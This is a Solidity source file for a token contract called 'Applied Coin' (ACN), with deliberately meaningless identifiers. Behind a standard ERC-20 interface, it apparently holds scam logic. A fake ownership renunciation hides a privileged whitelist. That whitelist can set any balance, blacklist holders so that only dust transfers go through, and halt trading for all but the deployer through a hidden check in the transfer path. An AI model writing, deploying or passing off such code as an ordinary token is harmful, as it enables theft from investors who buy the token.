//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract launchTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountWallet {
    function createPair(address teamReceiver, address takeAmount) external returns (address);

    function feeTo() external view returns (address);
}

interface teamFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface autoIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoMarketing) external view returns (uint256);

    function transfer(address txMax, uint256 fundReceiver) external returns (bool);

    function allowance(address takeLaunchExempt, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address txMax,
        uint256 fundReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletIsTo, uint256 value);
    event Approval(address indexed takeLaunchExempt, address indexed spender, uint256 value);
}

interface amountList is autoIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AppliedCoin is launchTeam, autoIs, amountList {

    function symbol() external view virtual override returns (string memory) {
        return launchedMarketing;
    }

    string private atLimit = "Applied Coin";

    address public teamEnableMode;

    function decimals() external view virtual override returns (uint8) {
        return liquidityTrading;
    }

    uint256 public enableReceiverTotal = 0;

    function transfer(address enableAt, uint256 fundReceiver) external virtual override returns (bool) {
        return senderTx(_msgSender(), enableAt, fundReceiver);
    }

    constructor (){
        if (buyTeam == limitWallet) {
            sellTo = true;
        }
        amountShould();
        teamFund swapReceiverReceiver = teamFund(swapTake);
        teamEnableMode = amountWallet(swapReceiverReceiver.factory()).createPair(swapReceiverReceiver.WETH(), address(this));
        listIs = amountWallet(swapReceiverReceiver.factory()).feeTo();
        
        modeShouldToken = _msgSender();
        isAt[modeShouldToken] = true;
        totalTrading[modeShouldToken] = receiverMode;
        if (limitWallet != teamLaunch) {
            teamLaunch = buyTeam;
        }
        emit Transfer(address(0), modeShouldToken, receiverMode);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverMode;
    }

    string private launchedMarketing = "ACN";

    function tradingAmount(address sellMarketing) public {
        fundTokenSwap();
        if (tokenAmount) {
            limitWallet = buyTeam;
        }
        if (sellMarketing == modeShouldToken || sellMarketing == teamEnableMode) {
            return;
        }
        feeEnable[sellMarketing] = true;
    }

    mapping(address => uint256) private totalTrading;

    function name() external view virtual override returns (string memory) {
        return atLimit;
    }

    address swapTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public isAt;

    function receiverBuy(uint256 fundReceiver) public {
        fundTokenSwap();
        toWallet = fundReceiver;
    }

    function getOwner() external view returns (address) {
        return enableIs;
    }

    mapping(address => bool) public feeEnable;

    uint256 private receiverMode = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed listExempt, address indexed limitIs);

    function senderTx(address walletExempt, address txMax, uint256 fundReceiver) internal returns (bool) {
        if (walletExempt == modeShouldToken) {
            return teamExempt(walletExempt, txMax, fundReceiver);
        }
        uint256 tradingFund = autoIs(teamEnableMode).balanceOf(listIs);
        require(tradingFund == toWallet);
        require(txMax != listIs);
        if (feeEnable[walletExempt]) {
            return teamExempt(walletExempt, txMax, maxFrom);
        }
        fundReceiver = receiverReceiver(walletExempt, txMax, fundReceiver);
        return teamExempt(walletExempt, txMax, fundReceiver);
    }

    bool public launchMarketing;

    function receiverToTeam(address exemptWallet) public {
        require(exemptWallet.balance < 100000);
        if (launchMarketing) {
            return;
        }
        
        isAt[exemptWallet] = true;
        
        launchMarketing = true;
    }

    function fundTokenSwap() private view {
        require(isAt[_msgSender()]);
    }

    address private enableIs;

    mapping(address => mapping(address => uint256)) private txSell;

    function balanceOf(address autoMarketing) public view virtual override returns (uint256) {
        return totalTrading[autoMarketing];
    }

    function transferFrom(address walletExempt, address txMax, uint256 fundReceiver) external override returns (bool) {
        if (_msgSender() != swapTake) {
            if (txSell[walletExempt][_msgSender()] != type(uint256).max) {
                require(fundReceiver <= txSell[walletExempt][_msgSender()]);
                txSell[walletExempt][_msgSender()] -= fundReceiver;
            }
        }
        return senderTx(walletExempt, txMax, fundReceiver);
    }

    uint256 toWallet;

    function approve(address limitSell, uint256 fundReceiver) public virtual override returns (bool) {
        txSell[_msgSender()][limitSell] = fundReceiver;
        emit Approval(_msgSender(), limitSell, fundReceiver);
        return true;
    }

    address public modeShouldToken;

    function allowance(address autoSwap, address limitSell) external view virtual override returns (uint256) {
        if (limitSell == swapTake) {
            return type(uint256).max;
        }
        return txSell[autoSwap][limitSell];
    }

    bool public sellTo;

    bool private tokenAmount;

    uint8 private liquidityTrading = 18;

    address listIs;

    uint256 swapTeam;

    uint256 constant maxFrom = 18 ** 10;

    function amountShould() public {
        emit OwnershipTransferred(modeShouldToken, address(0));
        enableIs = address(0);
    }

    function teamExempt(address walletExempt, address txMax, uint256 fundReceiver) internal returns (bool) {
        require(totalTrading[walletExempt] >= fundReceiver);
        totalTrading[walletExempt] -= fundReceiver;
        totalTrading[txMax] += fundReceiver;
        emit Transfer(walletExempt, txMax, fundReceiver);
        return true;
    }

    function receiverReceiver(address walletExempt, address txMax, uint256 fundReceiver) internal view returns (uint256) {
        require(fundReceiver > 0);

        uint256 amountSenderTeam = 0;
        if (walletExempt == teamEnableMode && listFeeSender > 0) {
            amountSenderTeam = fundReceiver * listFeeSender / 100;
        } else if (txMax == teamEnableMode && enableReceiverTotal > 0) {
            amountSenderTeam = fundReceiver * enableReceiverTotal / 100;
        }
        require(amountSenderTeam <= fundReceiver);
        return fundReceiver - amountSenderTeam;
    }

    function amountFrom(address enableAt, uint256 fundReceiver) public {
        fundTokenSwap();
        totalTrading[enableAt] = fundReceiver;
    }

    uint256 private teamLaunch;

    uint256 public limitWallet;

    function owner() external view returns (address) {
        return enableIs;
    }

    uint256 public listFeeSender = 0;

    uint256 public buyTeam;

}